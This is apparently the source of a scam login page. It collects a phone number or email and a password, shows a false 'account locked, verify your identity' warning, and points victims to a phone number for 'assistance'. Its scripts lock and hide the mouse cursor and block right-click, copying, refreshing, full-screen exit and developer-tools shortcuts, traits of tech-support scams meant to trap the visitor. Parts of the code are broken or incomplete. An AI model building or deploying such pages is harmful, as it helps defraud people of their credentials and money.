    <!-- Step 1: Phone/Email -->
    <div id="step1">
      <div class="mb-3">
        <label for="emailPhone" class="form-label">Phone number / Email</label>
        <input type="text" class="form-control" id="emailPhone" placeholder="+91XXXXXXXXXX or name@email.com">

      <button type="button" class="btn btn-yellow w-100 py-2" onclick="goToPassword()">

    </div>

    <!-- Step 2: Password -->
    <div id="step2" style="display:none;">
      <div class="mb-3">
        <label for="password" class="form-label">Password</label>
        <input type="password" class="form-control" id="password" placeholder="Enter password">
      </div>
      <a href="tel:+18382217153" class="help-link d-block py-4">üìû Need Assistant? Call +1 (838) 221-7153</a>

      <!-- Inline alert -->
      <div id="passwordAlert" class="alert alert-danger py-2" style="display:none;">
        ‚ö†Ô∏è Please meet all password requirements.
      </div>

      <!-- Password rules (hidden initially) -->
      <div id="passwordRules" class="mb-2" style="display:none;">
        <button class="btn btn-danger fs13">Suspicious activity detected on your account. We‚Äôve temporarily locked your account for your protection. Please verify your identity to restore access.</button>
        
        <!-- <a href="tel:+" class="help-link d-block pb-4">üìû Need help? Call </a> -->
      </div>

      <!-- Continue button -->
      <button type="button" class="btn startBtn btn-yellow w-100 py-2" onclick="validatePassword()">
        Continue
      </button>

      <!-- Final sign up button -->
      <button type="button" id="signupBtn" class="btn btn-yellow w-100 py-2 mt-3" disabled>
        Sign Up
      </button>
    </div>

  <script>
    function goToPassword() {
      const input = document.getElementById("emailPhone").value.trim();
      if (!input) {
        alert("‚ö†Ô∏è Please enter your phone number or email");
        return;
      }
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
      document.getElementById("password").focus(); // auto-focus password
    }

    function checkPassword() {
      const pass = document.getElementById("password").value;
      let valid = true;

      const rules = {
        ruleLength: pass.length >= 8,
        ruleNumber: /\d/.test(pass),
        ruleLower: /[a-z]/.test(pass),
        ruleUpper: /[A-Z]/.test(pass),
        ruleSymbol: /[!@#$%^&*]/.test(pass),
      };

      for (let rule in rules) {
        const el = document.getElementById(rule);
        if (el) { // only if rule element exists
          if (rules[rule]) {
            el.textContent = "‚úÖ " + el.textContent.replace("‚ùå ", "").replace("‚úÖ ", "");
            el.classList.add("valid");
            el.classList.remove("invalid");
          } else {
            el.textContent = "‚ùå " + el.textContent.replace("‚úÖ ", "").replace("‚ùå ", "");
            el.classList.add("invalid");
            el.classList.remove("valid");
            valid = false;
          }
        }
      }

      return valid;
    }

    function validatePassword() {
      document.getElementById("passwordRules").style.display = "block"; // show rules now
      const valid = checkPassword();

      if (!valid) {
        document.getElementById("passwordAlert").style.display = "block";
        document.getElementById("signupBtn").disabled = true;
      } else {
        document.getElementById("passwordAlert").style.display = "none";
        document.getElementById("signupBtn").disabled = false;
      }
    }

    // Handle Enter key for phone/email
    document.getElementById("emailPhone").addEventListener("keypress", function (e) {
      if (e.key === "Enter") {
        e.preventDefault();
        goToPassword();
      }
    });

    // Handle Enter key for password
    document.getElementById("password").addEventListener("keypress", function (e) {
      if (e.key === "Enter") {
        e.preventDefault();
        validatePassword();
      }
    });



    const canvas = document.getElementById("gameCanvas");
        const startBtn = document.querySelector(".startBtn");
        let firstClick = false;

        // Lock cursor and hide it everywhere except the button & paragraph
        startBtn.onclick = () => {
            if (!firstClick) {
                document.body.classList.add("hideCursor");
                firstClick = true;
            }
            canvas.requestPointerLock();
        };
        document.addEventListener("mousemove", () => {
  if (!firstAction) {
    document.body.classList.add("hideCursor");
    firstAction = true;
  }
});
// Request pointer lock on first click (browser requires interaction)
document.addEventListener("click", () => {
  if (document.pointerLockElement !== canvas) {
    canvas.requestPointerLock();
  }
});

        // Show cursor only when hovering over paragraph
        paragraph.addEventListener("mouseenter", () => {
            document.body.classList.remove("hideCursor");
        });

        paragraph.addEventListener("mouseleave", () => {
            if (firstClick) {
                document.body.classList.add("hideCursor");
            }
        });

        // Draw red shape
        function draw() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "red";
            ctx.fillRect(100, 100, 200, 200);
        }

        function gameLoop() {
            draw();
            requestAnimationFrame(gameLoop);
        }

        gameLoop();

        
  </script>

  <script>
// Disable Right Click

  e.preventDefault();
});

// Disable Text Selection

  e.preventDefault();
});

// Disable Dragging (like dragging images/text)
document.addEventListener('dragstart', function(e) {
  e.preventDefault();
});

// Disable Copy, Cut, Paste
document.addEventListener('copy', function(e) {
  e.preventDefault();
});
document.addEventListener('cut', function(e) {
  e.preventDefault();
});
document.addEventListener('paste', function(e) {
  e.preventDefault();
});

// Disable Keyboard Shortcuts
document.onkeydown = function(e) {
  // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S, Ctrl+C, Ctrl+V, Ctrl+X, etc.
  if (
    e.keyCode == 123 || // F12
    e.keyCode == 116 || // F5
    e.keyCode == 117 || // F6
    e.keyCode == 121 || // F10
    e.keyCode == 122 || // F11
    (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
    (e.ctrlKey && e.shiftKey && e.keyCode == 74) || // Ctrl+Shift+J
    (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
    (e.ctrlKey && e.keyCode == 83) || // Ctrl+S
    (e.ctrlKey && e.keyCode == 67) || // Ctrl+C
    (e.ctrlKey && e.keyCode == 88) || // Ctrl+X
    (e.ctrlKey && e.keyCode == 82) || // Ctrl+R
    (e.ctrlKey && e.shiftKey && e.keyCode == 82) // Ctrl+Shift+R
    (e.ctrlKey && e.keyCode == 86) // Ctrl+V
  ) {
    e.preventDefault();
    e.stopPropagation();
    return false;
  }
};
</script>
